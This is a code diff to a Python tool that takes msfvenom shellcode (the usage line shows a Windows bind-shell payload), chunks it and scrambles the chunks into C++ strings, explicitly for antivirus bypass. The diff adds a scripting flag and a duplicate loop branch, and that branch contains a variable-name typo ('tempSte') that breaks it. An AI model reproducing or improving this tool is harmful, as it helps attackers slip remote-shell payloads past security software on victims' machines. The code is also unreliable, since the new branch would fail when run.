@@ -9,6 +9,7 @@ import argparse
 parser = argparse.ArgumentParser(prog='scramblePayload', description='[*] Shellcode is recieved from STDIN from msfvenom and is chunked. Scrambled shellcode is presented for antivirus bypass.', usage='msfvenom -p windows/shell_bind_tcp LPORT=[PORT] -f hex | ./randPayload.py -c [CHUNK SIZE] -vn [C++ VARIABLE NAME]')
 parser.add_argument('-c', help='Give the size of the chunks you want the payload broken into. the smaller the better for AV bypass rates', type=int)
 parser.add_argument('-vn', help='Give the name of the variable you want for your C++ based code')
+parser.add_argument('-s', help='Allow the program to be scripted', action='store_true')
 args = parser.parse_args()
 
 
@@ -26,14 +27,23 @@ def randPayload(hexString, chunkSize, varName):
     """
     fixedChunk = {}
     part = 1
-    for chunk in chunked:
-        tempStr = ''
-        for byte in [chunk[i:i+2] for i in range(0, len(chunk), 2)]:
-            tempStr += str('\\x') + byte
-        fixedChunk[part] = tempStr
-        part = part + 1
+    if args.s:
+        for chunk in chunked:
+            tempStr = ''
+            for byte in [chunk[i:i+2] for i in range(0, len(chunk), 2)]:
+                tempSte += str("\\\\x") + byte
+            fixedChunk[part] = tempStr
+            part = part + 1
+    else:
+        for chunk in chunked:
+            tempStr = ''
+            for byte in [chunk[i:i+2] for i in range(0, len(chunk), 2)]:
+                tempStr += str('\\x') + byte
+            fixedChunk[part] = tempStr
+            part = part + 1
     
-    print('\n[*] The remaining input is formatted for use in C++ application development:\n')
+    #if not args.s:
+    #    print('\n[*] The remaining input is formatted for use in C++ application development:\n')
     print("// This is the declaration and definition of all of the strings for our payload out of order")
     # Randomly pick chunks of the shellcode to print until there are none left
     chosenList = []
